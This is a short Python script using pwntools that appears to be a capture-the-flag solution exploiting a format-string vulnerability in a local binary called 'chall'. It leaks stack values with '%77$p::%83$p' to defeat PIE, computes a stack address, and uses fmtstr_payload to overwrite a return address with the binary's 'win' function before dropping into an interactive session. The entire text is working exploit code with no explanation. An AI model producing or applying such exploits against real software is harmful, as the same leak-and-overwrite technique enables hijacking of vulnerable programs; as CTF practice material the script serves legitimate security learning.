from pwn import *

context.binary = elf = ELF("./chall")
context.terminal = ['xfce4-terminal', '-e']
#context.log_level = 'debug'
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
	p = gdb.debug([elf.path],'''
            b *perfect
            continue
        ''')
else:
    p = process()

p.sendline(b'%77$p::%83$p')
p.recvline()
a = p.recvline().split(b'::')
elf.address = int(a[0],16) - 0x139e
stack = int(a[1].strip(),16) - 0x120

success(f'pie {hex(elf.address)}')

payload = fmtstr_payload(6, {stack: elf.sym.win})

p.sendline(payload)

p.interactive()